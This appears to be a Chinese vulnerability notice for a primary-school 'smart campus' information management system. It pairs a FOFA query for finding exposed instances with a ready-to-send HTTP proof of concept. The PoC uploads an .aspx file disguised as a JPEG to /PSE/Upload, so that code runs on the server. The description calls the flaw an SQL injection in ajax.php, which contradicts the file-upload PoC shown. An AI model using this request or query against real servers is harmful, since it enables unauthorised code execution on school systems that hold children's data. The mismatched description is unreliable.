**fofa**

```
body="/Login/IndexMobi"
```

**一、漏洞简述**

小学智慧校园信息管理系统主要针对中小学市场研发，是全国首家采用B/S架构，基于云计算和物联网技术，通过浏览器直接登录就可以使用的新型应用管理系统。其接口ajax.php存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

**二、漏洞检测poc**

```yaml
POST /PSE/Upload HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36
Content-Type: multipart/form-data; boundary=230982304982309
Connection: close
Content-Length: 239

--230982304982309
Content-Disposition: form-data; name="file"; filename="Hello.aspx"
Content-Type: image/jpg

<%@Page Language="C#"%><%Response.Write("HelloWorldTest");System.IO.File.Delete(Request.PhysicalPath);%>
--230982304982309--
```

